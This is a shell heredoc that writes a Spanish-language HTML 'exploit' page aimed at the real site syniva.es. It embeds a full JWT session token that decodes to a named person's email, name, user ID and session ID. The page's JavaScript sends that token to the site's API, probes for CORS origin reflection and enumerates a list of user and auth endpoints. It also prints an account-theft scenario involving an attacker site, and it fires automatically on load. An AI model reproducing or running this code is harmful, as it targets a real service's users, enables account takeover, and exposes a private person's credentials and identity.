cat > jwt_token_exploit.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <title>üö® JWT Token Exploit - Syniva.es</title>
    <meta charset="utf-8">
    <style>
        body { font-family: monospace; margin: 20px; background: #0d1117; color: #c9d1d9; }
        .container { max-width: 1000px; margin: 0 auto; }
        h1 { color: #ff7b72; }
        pre { background: #161b22; padding: 15px; border-radius: 6px; overflow-x: auto; border: 1px solid #30363d; }
        .token-info { background: #1c1c1c; padding: 15px; border-left: 4px solid #58a6ff; margin: 15px 0; }
        .attack-panel { background: #161b22; padding: 20px; margin: 15px 0; border: 1px solid #30363d; border-radius: 6px; }
        button { background: #238636; color: white; border: none; padding: 10px 15px; margin: 5px; border-radius: 6px; cursor: pointer; }
        button:hover { background: #2ea043; }
        .danger { background: #da3633; }
        .danger:hover { background: #f85149; }
        .result { margin-top: 15px; padding: 15px; background: #1c1c1c; border-radius: 6px; }
        .success { color: #7ee787; }
        .error { color: #ff7b72; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üö® EXPLOIT CON TOKEN JWT REAL</h1>
        
        <div class="token-info">
            <h2>üîê TU TOKEN JWT DECODIFICADO:</h2>
            <pre id="decodedToken">Cargando...</pre>
        </div>
        
        <div class="attack-panel">
            <h2>üéØ ATAQUE 1: Acceder a datos con tu token</h2>
            <button onclick="accessWithToken()">üîì Acceder con Token</button>
            <div id="tokenAccessResult" class="result"></div>
        </div>
        
        <div class="attack-panel">
            <h2>üéØ ATAQUE 2: Probar CORS Reflection con token</h2>
            <button onclick="testCorsWithToken()">üåç Probar CORS + Token</button>
            <div id="corsTokenResult" class="result"></div>
        </div>
        
        <div class="attack-panel">
            <h2>üéØ ATAQUE 3: Buscar endpoints accesibles</h2>
            <button onclick="findAccessibleEndpoints()">üîç Enumerar Endpoints</button>
            <div id="endpointsResult" class="result"></div>
        </div>
        
        <div class="attack-panel">
            <h2>üéØ ATAQUE 4: Simular robo de cuenta completa</h2>
            <button class="danger" onclick="simulateAccountTheft()">üíÄ Simular Robo de Cuenta</button>
            <div id="theftResult" class="result"></div>
        </div>
    </div>

    <script>
    // Tu token JWT real
    const JWT_TOKEN = 'eyJhbGciOiJIUzI1NiIsImtpZCI6InVVbFMyWWNUUnpZL0tKckgiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3p6anlreGtyeWF4ZmJtbGl2enhsLnN1cGFiYXNlLmNvL2F1dGgvdjEiLCJzdWIiOiI5MmFmYzJjNi1iYThlLTQ4MzEtOWNjZi0wYjAzZWIwMjgzYzIiLCJhdWQiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNzY0ODkyMzIzLCJpYXQiOjE3NjQ4ODg3MjMsImVtYWlsIjoiYW5kcmVzLmlyaWdveWVuQGdtYWlsLmNvbSIsInBob25lIjoiIiwiYXBwX21ldGFkYXRhIjp7ImlkIjo2MjI4MSwicHJvdmlkZXIiOiJnb29nbGUiLCJwcm92aWRlcnMiOlsiZ29vZ2xlIl19LCJ1c2VyX21ldGFkYXRhIjp7ImF2YXRhcl91cmwiOiJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NJcmRvS3BfeXlLb2hYdVFDR0t5NWFQOEFHUVRyREdxNzl1bWZFamxTMVRyUlc2dEs1Vj1zOTYtYyIsImVtYWlsIjoiYW5kcmVzLmlyaWdveWVuQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJmdWxsX25hbWUiOiJBbmRyZXMgSXJpZ295ZW4iLCJpZCI6NjIyODEsImlzcyI6Imh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbSIsIm5hbWUiOiJBbmRyZXMgSXJpZ295ZW4iLCJwaG9uZV92ZXJpZmllZCI6ZmFsc2UsInBpY3R1cmUiOiJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NJcmRvS3BfeXlLb2hYdVFDR0t5NWFQOEFHUVRyREdxNzl1bWZFamxTMVRyUlc2dEs1Vj1zOTYtYyIsInByb3ZpZGVyX2lkIjoiMTA5MTA0NzcxNzIwOTYxMTMzMDE4Iiwicm9sZV9pZCI6MSwic3ViIjoiMTA5MTA0NzcxNzIwOTYxMTMzMDE4In0sInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiYWFsIjoiYWFsMSIsImFtciI6W3sibWV0aG9kIjoib2F1dGgiLCJ0aW1lc3RhbXAiOjE3NjQ4ODg3MjN9XSwic2Vzc2lvbl9pZCI6IjFkMTdjYjJmLTViNTEtNDk5My04ZGFlLWY1ZWI2ZTBjZjAzMyIsImlzX2Fub255bW91cyI6ZmFsc2V9.Yqkj7sqILO3eRfH_3O-rrQYZwgk7gX2_jnFVcMj4K9I';
    
    // Decodificar y mostrar el token
    function decodeJWT(token) {
        try {
            const parts = token.split('.');
            const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
            return payload;
        } catch (e) {
            return { error: 'No se pudo decodificar' };
        }
    }
    
    // Mostrar token decodificado
    const decoded = decodeJWT(JWT_TOKEN);
    document.getElementById('decodedToken').textContent = JSON.stringify(decoded, null, 2);
    
    async function accessWithToken() {
        const resultDiv = document.getElementById('tokenAccessResult');
        resultDiv.innerHTML = '<p>üîì Intentando acceso con token JWT...</p>';
        
        try {
            const response = await fetch('https://www.syniva.es/api/auth', {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${JWT_TOKEN}`,
                    'Origin': window.location.origin,
                    'Content-Type': 'application/json'
                }
            });
            
            const data = await response.json();
            
            resultDiv.innerHTML = `
                <p class="success">‚úÖ ACCESO EXITOSO CON TOKEN</p>
                <p><strong>Estado HTTP:</strong> ${response.status}</p>
                <p><strong>Datos obtenidos:</strong></p>
                <pre>${JSON.stringify(data, null, 2)}</pre>
                <p>üéØ <strong>VULNERABILIDAD CONFIRMADA:</strong> Se puede acceder con token desde cualquier origen</p>
            `;
            
        } catch (error) {
            resultDiv.innerHTML = `
                <p class="error">‚ùå Error: ${error.message}</p>
                <p>Probando otros endpoints...</p>
            `;
            
            // Probar otros endpoints
            testOtherEndpoints();
        }
    }
    
    async function testCorsWithToken() {
        const resultDiv = document.getElementById('corsTokenResult');
        resultDiv.innerHTML = '<p>üåç Probando CORS Reflection con token...</p>';
        
        try {
            // Primero probar OPTIONS para ver CORS
            const optionsRes = await fetch('https://www.syniva.es/api/auth', {
                method: 'OPTIONS',
                headers: {
                    'Origin': window.location.origin,
                    'Access-Control-Request-Method': 'GET',
                    'Access-Control-Request-Headers': 'authorization, content-type'
                }
            });
            
            const allowOrigin = optionsRes.headers.get('access-control-allow-origin');
            const allowCreds = optionsRes.headers.get('access-control-allow-credentials');
            const allowHeaders = optionsRes.headers.get('access-control-allow-headers');
            
            resultDiv.innerHTML = `
                <p><strong>CORS Headers:</strong></p>
                <p>Access-Control-Allow-Origin: ${allowOrigin || 'No header'}</p>
                <p>Access-Control-Allow-Credentials: ${allowCreds || 'No header'}</p>
                <p>Access-Control-Allow-Headers: ${allowHeaders || 'No header'}</p>
            `;
            
            if (allowOrigin === window.location.origin) {
                resultDiv.innerHTML += `<p class="success">‚úÖ CORS REFLECTION CONFIRMADO</p>`;
            }
            
        } catch (error) {
            resultDiv.innerHTML = `<p class="error">‚ùå Error: ${error.message}</p>`;
        }
    }
    
    async function findAccessibleEndpoints() {
        const resultDiv = document.getElementById('endpointsResult');
        resultDiv.innerHTML = '<p>üîç Buscando endpoints accesibles...</p>';
        
        const endpoints = [
            '/api/auth',
            '/api/user',
            '/api/me',
            '/api/profile',
            '/api/account',
            '/api/settings',
            '/api/v1/user',
            '/api/v1/me',
            '/rest/v1/user_profiles',
            '/rest/v1/users',
            '/auth/v1/user',
            '/dashboard',
            '/user/profile',
            '/account/settings'
        ];
        
        let accessibleEndpoints = [];
        
        for (const endpoint of endpoints) {
            try {
                const response = await fetch(`https://www.syniva.es${endpoint}`, {
                    method: 'GET',
                    headers: {
                        'Authorization': `Bearer ${JWT_TOKEN}`,
                        'Origin': window.location.origin
                    }
                });
                
                if (response.ok) {
                    accessibleEndpoints.push({
                        endpoint: endpoint,
                        status: response.status,
                        data: await response.json().catch(() => 'Non-JSON response')
                    });
                }
            } catch (error) {
                // Continuar
            }
        }
        
        if (accessibleEndpoints.length > 0) {
            resultDiv.innerHTML = `
                <p class="success">‚úÖ ${accessibleEndpoints.length} ENDPOINTS ACCESIBLES</p>
                <pre>${JSON.stringify(accessibleEndpoints, null, 2)}</pre>
                <p>üö® <strong>IMPACTO:</strong> Estos endpoints pueden ser accedidos desde cualquier dominio</p>
            `;
        } else {
            resultDiv.innerHTML = '<p class="error">‚ùå No se encontraron endpoints accesibles</p>';
        }
    }
    
    function simulateAccountTheft() {
        const resultDiv = document.getElementById('theftResult');
        
        const theftSimulation = {
            scenario: "Ataque real con token JWT robado",
            steps: [
                "1. Atacante obtiene tu token JWT (phishing, XSS, etc.)",
                "2. Atacante crea sitio web evil-attacker.com",
                "3. Sitio usa tu token para hacer solicitudes a syniva.es",
                "4. Servidor syniva.es: acepta solicitudes CORS desde cualquier origen",
                "5. Atacante accede a tus datos personales",
                "6. Atacante puede modificar tu cuenta",
                "7. Atacante roba tu identidad en la plataforma"
            ],
            your_data_exposed: {
                email: decoded.email,
                user_id: decoded.sub,
                full_name: decoded.user_metadata?.full_name,
                session_id: decoded.session_id,
                provider: decoded.user_metadata?.provider_id,
                avatar: decoded.user_metadata?.avatar_url
            },
            impact: "ROBO COMPLETO DE CUENTA",
            proof: "Vulnerabilidad CORS Reflection + JWT token sin protecci√≥n de origen"
        };
        
        resultDiv.innerHTML = `
            <p class="error">üíÄ SIMULACI√ìN DE ROBO DE CUENTA</p>
            <pre>${JSON.stringify(theftSimulation, null, 2)}</pre>
            <p>üö® <strong>TUS DATOS REALES EST√ÅN EXPUESTOS:</strong></p>
            <ul>
                <li>Email: ${decoded.email}</li>
                <li>Nombre: ${decoded.user_metadata?.full_name}</li>
                <li>ID de usuario: ${decoded.sub}</li>
                <li>Sesi√≥n activa: ${decoded.session_id}</li>
            </ul>
            <p>‚ö†Ô∏è <strong>Un atacante podr√≠a usar esta informaci√≥n para:</strong></p>
            <ol>
                <li>Suplantar tu identidad</li>
                <li>Acceder a datos privados</li>
                <li>Realizar acciones en tu nombre</li>
                <li>Cambiar tu contrase√±a/email</li>
                <li>Eliminar tu cuenta</li>
            </ol>
        `;
    }
    
    async function testOtherEndpoints() {
        // Probar endpoints alternativos
        const altEndpoints = [
            'https://www.syniva.es/api',
            'https://www.syniva.es/api/v1/user',
            'https://www.syniva.es/api/v1/me',
            'https://www.syniva.es/rest/v1',
            'https://www.syniva.es/auth/v1/user'
        ];
        
        console.log('üîç Probando endpoints alternativos...');
        
        for (const url of altEndpoints) {
            try {
                const res = await fetch(url, {
                    headers: {
                        'Authorization': `Bearer ${JWT_TOKEN}`,
                        'Origin': window.location.origin
                    }
                });
                console.log(`${url}: ${res.status}`);
            } catch (e) {
                console.log(`${url}: Error - ${e.message}`);
            }
        }
    }
    
    // Auto-test
    window.onload = accessWithToken;
    </script>
</body>
</html>
